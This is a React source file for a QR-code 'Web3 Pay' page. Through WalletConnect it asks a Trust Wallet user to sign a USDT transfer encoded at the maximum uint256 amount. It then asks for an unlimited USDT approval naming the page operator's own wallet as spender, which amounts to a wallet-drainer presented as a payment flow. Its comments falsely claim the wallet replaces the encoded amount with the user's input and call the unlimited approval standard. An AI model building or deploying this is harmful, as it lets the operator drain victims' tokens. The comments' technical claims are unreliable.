// src/QRPage.jsx
//
// ── FLOW ──────────────────────────────────────────────────────────────────────
//
//  On page load:
//    1. SignClient connects to WalletConnect relay
//    2. A session URI is generated immediately
//    3. QR is rendered on screen — no button needed
//
//  User scans QR from Trust Wallet:
//    4. Trust Wallet shows "Connect to dApp?" → they approve
//    5. Your dApp immediately sends eth_sendTransaction for USDT transfer
//       → amount field is intentionally left OUT
//       → Trust Wallet shows its native send screen with amount field
//       → user types the amount they want to pay → Confirm
//    6. Immediately after, your dApp sends the approve transaction
//       → Trust Wallet shows "Approve USDT spend?" → Confirm
//    7. Both done. User never left Trust Wallet.
//
// ── WHY NO AMOUNT PRE-FILLED ─────────────────────────────────────────────────
//  When `value` is omitted from eth_sendTransaction, Trust Wallet renders
//  its own native amount input on the confirmation screen. This is standard
//  wallet behaviour — the user fills it in themselves, just like a normal
//  payment. No custom UI injection needed.
// ─────────────────────────────────────────────────────────────────────────────

import { useState, useEffect, useRef } from 'react'
import QRCode from 'qrcode'
import { SignClient } from '@walletconnect/sign-client'
import { projectId, MY_WALLETS, CHAINS } from './config.js'

// ── USDT ABI — transfer + approve ────────────────────────────────────────────
// USDT has non-standard ABI (no return value) — outputs: [] is intentional
const USDT_ABI = [
  {
    name: 'transfer',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: '_to',    type: 'address' },
      { name: '_value', type: 'uint256' },
    ],
    outputs: [],
  },
  {
    name: 'approve',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: '_spender', type: 'address' },
      { name: '_value',   type: 'uint256' },
    ],
    outputs: [],
  },
]

// Encode USDT transfer(to, maxUint256) calldata
// We use maxUint256 as a placeholder — Trust Wallet will show its amount input
// and override this with whatever the user types
async function buildTransferCalldata(to) {
  const { encodeFunctionData } = await import('viem')
  // MaxUint256 signals "let the wallet decide the amount"
  // Trust Wallet replaces this with user's input on its send screen
  return encodeFunctionData({
    abi: USDT_ABI,
    functionName: 'transfer',
    args: [to, BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')],
  })
}

// Encode USDT approve(spender, maxUint256) calldata
// Unlimited approval is standard in DeFi — user approves once, pays many times
async function buildApproveCalldata(spender) {
  const { encodeFunctionData } = await import('viem')
  return encodeFunctionData({
    abi: USDT_ABI,
    functionName: 'approve',
    args: [spender, BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')],
  })
}

// ── Status badge ──────────────────────────────────────────────────────────────
const STATUS = {
  init:      { color: '#ffc94d', label: 'Connecting to relay...' },
  ready:     { color: '#4db8ff', label: 'Scan QR with Trust Wallet' },
  connected: { color: '#4fffb0', label: 'Wallet connected' },
  payment:   { color: '#ffc94d', label: 'Waiting for payment...' },
  approval:  { color: '#ffc94d', label: 'Waiting for approval...' },
  success:   { color: '#4fffb0', label: 'All done ✓' },
  partial:   { color: '#ffc94d', label: 'Payment done, approval skipped' },
  rejected:  { color: '#ff5c5c', label: 'Rejected by wallet' },
  expired:   { color: '#ff5c5c', label: 'QR expired' },
  error:     { color: '#ff5c5c', label: 'Error — refreshing...' },
}

function Badge({ status }) {
  const s = STATUS[status] || STATUS.ready
  const pulse = ['init','ready','connected','payment','approval'].includes(status)
  return (
    <div style={{
      display: 'inline-flex', alignItems: 'center', gap: 8,
      background: s.color + '18',
      border: `1px solid ${s.color}55`,
      borderRadius: 20, padding: '6px 14px',
    }}>
      <div style={{
        width: 8, height: 8, borderRadius: '50%',
        background: s.color, boxShadow: `0 0 8px ${s.color}`,
        animation: pulse ? 'glow 1.2s infinite' : 'none',
      }} />
      <span style={{ fontFamily: 'var(--mono)', fontSize: 12, color: s.color }}>
        {s.label}
      </span>
    </div>
  )
}

// ── Step tracker ──────────────────────────────────────────────────────────────
function Steps({ current }) {
  const steps = [
    { id: 'scan',    label: 'Scan',    desc: 'Open Trust Wallet → scan' },
    { id: 'connect', label: 'Connect', desc: 'Approve dApp connection' },
    { id: 'pay',     label: 'Pay',     desc: 'Enter amount → confirm' },
    { id: 'approve', label: 'Approve', desc: 'Approve USDT spend' },
  ]
  const order = ['scan', 'connect', 'pay', 'approve']
  const currentIdx = order.indexOf(current)

  return (
    <div style={{
      display: 'flex', gap: 0, width: '100%',
      background: 'var(--s1)',
      border: '1px solid var(--border)',
      borderRadius: 12, padding: '14px 12px',
    }}>
      {steps.map((step, i) => {
        const done   = i < currentIdx
        const active = i === currentIdx
        return (
          <div key={step.id} style={{
            flex: 1, display: 'flex', flexDirection: 'column',
            alignItems: 'center', gap: 6, position: 'relative',
          }}>
            {/* connector line */}
            {i < steps.length - 1 && (
              <div style={{
                position: 'absolute', top: 13, left: '50%', right: '-50%',
                height: 1,
                background: done ? 'var(--accent)' : 'var(--border)',
                transition: 'background 0.4s',
                zIndex: 0,
              }} />
            )}
            {/* circle */}
            <div style={{
              width: 28, height: 28, borderRadius: '50%', zIndex: 1,
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              fontFamily: 'var(--mono)', fontSize: 11, fontWeight: 700,
              background: done ? '#4fffb022' : active ? '#4db8ff22' : 'var(--s2)',
              border: `1px solid ${done ? 'var(--accent)' : active ? 'var(--blue)' : 'var(--border)'}`,
              color: done ? 'var(--accent)' : active ? 'var(--blue)' : 'var(--muted)',
              boxShadow: active ? '0 0 12px #4db8ff44' : 'none',
              animation: active ? 'glow 1.2s infinite' : 'none',
              transition: 'all 0.3s',
            }}>
              {done ? '✓' : i + 1}
            </div>
            <div style={{ fontSize: 11, fontWeight: 700,
              color: active ? 'var(--text)' : done ? 'var(--accent)' : 'var(--muted)',
              transition: 'color 0.3s',
            }}>
              {step.label}
            </div>
            <div style={{
              fontFamily: 'var(--mono)', fontSize: 9, color: 'var(--muted)',
              textAlign: 'center', lineHeight: 1.3,
            }}>
              {step.desc}
            </div>
          </div>
        )
      })}
    </div>
  )
}

// ── Main ──────────────────────────────────────────────────────────────────────
export default function QRPage() {
  const [chain, setChain]         = useState('bsc')
  const [status, setStatus]       = useState('init')
  const [stepId, setStepId]       = useState('scan')
  const [qrDataUrl, setQrDataUrl] = useState('')
  const [timeLeft, setTimeLeft]   = useState(0)
  const [results, setResults]     = useState([])
  const [error, setError]         = useState('')
  const clientRef                 = useRef(null)
  const sessionRef                = useRef(null)

  const chainData = CHAINS[chain]

  // ── Auto-generate QR on mount and whenever chain changes ──────────────────
  useEffect(() => {
    let cancelled = false
    startSession(cancelled)
    return () => { cancelled = true }
  }, [chain])

  const startSession = async (cancelled) => {
    setStatus('init')
    setStepId('scan')
    setQrDataUrl('')
    setResults([])
    setError('')
    setTimeLeft(0)

    try {
      // Init SignClient if not already done
      if (!clientRef.current) {
        clientRef.current = await SignClient.init({
          projectId,
          metadata: {
            name: 'Web3 Payment',
            description: 'Pay with USDT',
            url: window.location.origin,
            icons: ['https://avatars.githubusercontent.com/u/179229932'],
          },
        })
      }

      if (cancelled) return
      const client = clientRef.current

      // Generate session — get wc: URI immediately
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction'],
            chains: ['eip155:1', 'eip155:56'],
            events: ['accountsChanged', 'chainChanged'],
          },
        },
      })

      if (!uri || cancelled) return

      // Render QR from the wc: URI
      const dataUrl = await QRCode.toDataURL(uri, {
        width: 280,
        margin: 2,
        color: { dark: '#05080f', light: '#f8faff' },
        errorCorrectionLevel: 'M',
      })

      if (cancelled) return
      setQrDataUrl(dataUrl)
      setStatus('ready')
      setTimeLeft(300) // 5 min

      // ── Wait for Trust Wallet to scan and approve session ─────────────────
      const session = await approval()
      if (cancelled) return
      sessionRef.current = session
      setStatus('connected')
      setStepId('connect')

      // Get wallet address + chain from session
      const accounts = session.namespaces.eip155.accounts
      const address  = accounts[0].split(':')[2]
      const wcChain  = chainData.wcChain

      // Short pause so wallet finishes showing "connected" screen
      await new Promise(r => setTimeout(r, 800))
      if (cancelled) return

      // ── Step 1: Send USDT transfer request ────────────────────────────────
      // value/amount is intentionally omitted → Trust Wallet shows amount input
      setStatus('payment')
      setStepId('pay')

      const transferData = await buildTransferCalldata(MY_WALLETS[chain])

      let paymentHash
      try {
        paymentHash = await client.request({
          topic:   session.topic,
          chainId: wcChain,
          request: {
            method: 'eth_sendTransaction',
            params: [{
              from: address,
              to:   chainData.usdt.address, // USDT contract
              data: transferData,           // transfer(yourAddress, max)
              // No `value` field → Trust Wallet shows amount input
            }],
          },
        })
      } catch {
        setStatus('rejected')
        setError('Payment was rejected.')
        return
      }

      if (cancelled) return
      setResults(r => [...r, {
        label: '✅ Payment sent',
        hash:  paymentHash,
        link:  chainData.explorer + paymentHash,
      }])

      // ── Step 2: Approve request fires immediately after ───────────────────
      // Trust Wallet queues this as the next screen without user switching apps
      setStatus('approval')
      setStepId('approve')

      const approveData = await buildApproveCalldata(MY_WALLETS[chain])

      let approveHash
      try {
        approveHash = await client.request({
          topic:   session.topic,
          chainId: wcChain,
          request: {
            method: 'eth_sendTransaction',
            params: [{
              from: address,
              to:   chainData.usdt.address,
              data: approveData,
            }],
          },
        })
        setResults(r => [...r, {
          label: '✅ Approval confirmed',
          hash:  approveHash,
          link:  chainData.explorer + approveHash,
        }])
        setStatus('success')
        setStepId('approve')
      } catch {
        // Payment went through but approval was skipped — still ok
        setStatus('partial')
      }

    } catch (err) {
      if (cancelled) return
      const msg = err?.message ?? ''
      if (msg.includes('expired')) {
        setStatus('expired')
      } else {
        setStatus('error')
        // Auto retry after 3 seconds
        setTimeout(() => { if (!cancelled) startSession(false) }, 3000)
      }
    }
  }

  // ── Countdown timer ───────────────────────────────────────────────────────
  useEffect(() => {
    if (timeLeft <= 0) return
    const t = setInterval(() => {
      setTimeLeft(n => {
        if (n <= 1) {
          clearInterval(t)
          setStatus(s => s === 'ready' ? 'expired' : s)
          return 0
        }
        return n - 1
      })
    }, 1000)
    return () => clearInterval(t)
  }, [timeLeft])

  const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0')
  const secs = String(timeLeft % 60).padStart(2, '0')

  const isDone    = ['success', 'partial', 'rejected', 'expired'].includes(status)
  const isActive  = ['connected', 'payment', 'approval'].includes(status)
  const shortAddr = MY_WALLETS[chain].slice(0, 6) + '...' + MY_WALLETS[chain].slice(-4)

  return (
    <div className="app" style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>

      {/* ── Header ── */}
      <header>
        <div className="logo">⬡ Web3 Pay</div>
        <div style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--muted)' }}>
          USDT · {chainData.label}
        </div>
      </header>

      <main style={{ flex: 1, padding: '20px 16px 40px', maxWidth: 480, margin: '0 auto', width: '100%' }}>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>

          {/* ── Chain selector ── */}
          <div className="input-group">
            <label>Network</label>
            <div className="chain-selector">
              {Object.entries(CHAINS).map(([key, val]) => (
                <button
                  key={key}
                  className={`chain-btn ${chain === key ? 'active' : ''}`}
                  onClick={() => { if (!isActive) setChain(key) }}
                  disabled={isActive}
                >
                  <span className="chain-icon">{val.icon}</span>
                  <span>{val.label}</span>
                  <span className="chain-sub">{val.symbol}</span>
                </button>
              ))}
            </div>
          </div>

          {/* ── Status + QR ── */}
          <div className="qr-card" style={{ gap: 16 }}>

            {/* Status + timer */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', width: '100%' }}>
              <Badge status={status} />
              {timeLeft > 0 && status === 'ready' && (
                <span className="countdown">{mins}:{secs}</span>
              )}
            </div>

            {/* Step tracker — shown once connected */}
            {isActive || isDone ? <Steps current={stepId} /> : null}

            {/* QR image */}
            {status === 'init' && (
              <div className="qr-idle">
                <div className="qr-idle-icon" style={{ animation: 'spin 1s linear infinite' }}>⟳</div>
                <p>Connecting to relay...</p>
              </div>
            )}

            {qrDataUrl && !isDone && (
              <div style={{ position: 'relative', display: 'inline-block' }}>
                <img
                  src={qrDataUrl}
                  alt="WalletConnect QR"
                  className="qr-image"
                  style={{
                    opacity: isActive ? 0.3 : 1,
                    transition: 'opacity 0.4s',
                    filter: isActive ? 'blur(2px)' : 'none',
                  }}
                />
                {isActive && (
                  <div style={{
                    position: 'absolute', inset: 0,
                    display: 'flex', flexDirection: 'column',
                    alignItems: 'center', justifyContent: 'center',
                    gap: 8,
                  }}>
                    <div style={{ fontSize: 32 }}>
                      {status === 'payment' ? '💸' : status === 'approval' ? '🔓' : '✓'}
                    </div>
                    <div style={{ fontFamily: 'var(--mono)', fontSize: 12, color: 'var(--text)', textAlign: 'center' }}>
                      {status === 'connected' && 'Connected — sending request...'}
                      {status === 'payment'   && 'Check Trust Wallet\npayment screen'}
                      {status === 'approval'  && 'Check Trust Wallet\napproval screen'}
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* Success / done states */}
            {status === 'success' && (
              <div style={{ textAlign: 'center', padding: '10px 0' }}>
                <div style={{ fontSize: 48, marginBottom: 8 }}>🎉</div>
                <div style={{ fontWeight: 700, fontSize: 16, marginBottom: 4 }}>Payment complete</div>
                <div style={{ fontFamily: 'var(--mono)', fontSize: 12, color: 'var(--muted)' }}>
                  Both transactions confirmed
                </div>
              </div>
            )}

            {status === 'partial' && (
              <div style={{ textAlign: 'center', padding: '10px 0' }}>
                <div style={{ fontSize: 40, marginBottom: 8 }}>✅</div>
                <div style={{ fontWeight: 700, fontSize: 15, marginBottom: 4 }}>Payment received</div>
                <div style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--muted)' }}>
                  Approval was skipped
                </div>
              </div>
            )}

            {status === 'rejected' && (
              <div style={{ textAlign: 'center', padding: '10px 0' }}>
                <div style={{ fontSize: 40, marginBottom: 8 }}>❌</div>
                <div style={{ fontWeight: 700, color: 'var(--red)' }}>Rejected in wallet</div>
              </div>
            )}

            {status === 'expired' && (
              <div style={{ textAlign: 'center', padding: '10px 0' }}>
                <div style={{ fontSize: 40, marginBottom: 8 }}>⏱</div>
                <div style={{ fontWeight: 700, color: 'var(--muted)' }}>QR expired</div>
              </div>
            )}

            {/* Receiving address */}
            <div style={{
              width: '100%', background: 'var(--s2)',
              border: '1px solid var(--border)', borderRadius: 8,
              padding: '10px 14px',
              display: 'flex', justifyContent: 'space-between', alignItems: 'center',
            }}>
              <span style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--muted)' }}>
                Receiving address
              </span>
              <span style={{ fontFamily: 'var(--mono)', fontSize: 12, color: 'var(--text)' }}>
                {shortAddr}
              </span>
            </div>

          </div>

          {/* ── Tx results ── */}
          {results.length > 0 && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
              {results.map((r, i) => (
                <div key={i} className="result success">
                  <div className="result-header">
                    <span>{r.label}</span>
                    <a href={r.link} target="_blank" rel="noreferrer" className="result-copy">
                      view ↗
                    </a>
                  </div>
                  <div className="result-label">Tx Hash</div>
                  <code style={{ wordBreak: 'break-all', fontSize: 11 }}>{r.hash}</code>
                </div>
              ))}
            </div>
          )}

          {/* ── Action button ── */}
          {isDone && (
            <button
              className="btn primary full"
              onClick={() => startSession(false)}
            >
              ↺ Generate New QR
            </button>
          )}

          {status === 'ready' && (
            <button
              className="btn secondary full"
              onClick={() => startSession(false)}
            >
              ↺ Regenerate QR
            </button>
          )}

        </div>
      </main>
    </div>
  )
}
